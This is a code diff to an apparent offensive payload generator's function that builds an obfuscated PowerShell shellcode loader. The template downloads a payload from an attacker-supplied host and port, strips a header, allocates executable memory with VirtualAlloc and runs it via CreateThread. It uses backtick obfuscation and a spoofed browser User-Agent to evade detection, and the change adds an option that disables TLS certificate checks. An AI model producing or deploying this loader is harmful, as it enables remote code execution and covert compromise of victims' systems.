@@ -26,6 +26,11 @@ def generateMPPSLoader(mpProto, mpLhost, mpLport, mpArch, mpSsize):
     elif mpArch == "x64":
         mpArch = "ToInt64"
         mpDef = "UInt64"
+    
+    if mpProto == "https":
+        mpPSSSLChk = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}"
+    else:
+        mpPSSSLChk = ""
 
     loaderHost = mpProto+"://"+mpLhost+":"+mpLport+"/"+genHTTPChecksum()
     baseMetPs = '''${0} = @"
@@ -33,9 +38,10 @@ def generateMPPSLoader(mpProto, mpLhost, mpLport, mpArch, mpSsize):
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, {8} dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, {8} dwCreationFlags, IntPtr lpThreadId);
 [DllImport("kernel32.dll")] public static extern {8} WaitForSingleObject(IntPtr hHandle, {8} dwMilliseconds);
 "@;
+{10}
 ${1} = New-Object "`N`et.`W`ebc`l`i`ent";${1}.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)");${1}.Headers.Add("Accept", "*/*");${1}.Headers.Add("Accept-Language", "en-gb,en;q=0.5");[Byte[]] ${2} = ${1}."D`o`wn`l`oa`d`Data"("{9}");${3} = New-Object byte[] (${2}.Length - {4});[Array]::Copy(${2}, {4}, ${3}, 0, (${2}.Length - {4}));${5} = A`d`d-T`y`p`e -memberDefinition ${0} -Name "Win32" -namespace `W`in`3`2`F`un`ct`i`on`s -passthru;${6}=${5}::VirtualAlloc(0,${3}.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy(${3}, 0, [IntPtr](${6}.{7}()), ${3}.Length);${5}::CreateThread(0,0,${6},0,0,0) | oUT-NuLl;`S`T`A`R`T-`S`l`e`E`p -s `8`6`4`2`0'''
 
-    loaderFinal = baseMetPs.format(randomString(), randomString(), randomString(), randomString(), mpSsize, randomString(), randomString(), mpArch, mpDef, loaderHost)
+    loaderFinal = baseMetPs.format(randomString(), randomString(), randomString(), randomString(), mpSsize, randomString(), randomString(), mpArch, mpDef, loaderHost, mpPSSSLChk)
     return loaderFinal
 
 def generateMPPSCsharpLoader(mpPsCode):
